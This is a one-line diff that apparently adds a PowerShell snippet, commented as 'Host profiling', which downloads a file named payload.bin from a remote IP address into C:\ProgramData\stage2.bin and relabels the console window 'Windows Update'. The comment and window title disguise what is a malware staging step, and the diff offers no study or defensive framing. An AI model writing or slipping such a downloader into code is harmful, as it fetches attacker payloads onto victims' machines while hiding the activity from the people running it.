@@ -1,0 +1,1 @@
+<# Host profiling #> try { $DownloadUrl = 'https://203.0.113.182/downloads/payload.bin'; $PayloadPath = "C:\ProgramData\stage2.bin"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $PayloadPath -UseBasicParsing; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Stage transfer failed" }
